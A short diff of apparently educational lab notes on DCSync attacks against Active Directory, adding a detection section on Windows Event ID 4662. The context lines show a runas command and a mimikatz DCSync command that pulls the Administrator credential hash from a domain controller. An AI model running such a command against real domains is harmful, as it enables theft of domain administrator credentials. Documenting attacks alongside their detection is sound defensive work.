@@ -15,4 +15,15 @@ runas.exe /user:eagle\rocky cmd.exe
 mimikatz> lsadump::dcsync /domain:eagle.local /dc:DC1.eagle.local /user:Administrator
 ```
 
-# Detect
+# Detect 
+## Event ID 4662
+
+An operation was performed on an object
+
+This event is commonly associated with:
+
+Active Directory object access
+LDAP operations
+Permission changes
+DCSync detection
+Directory replication activity
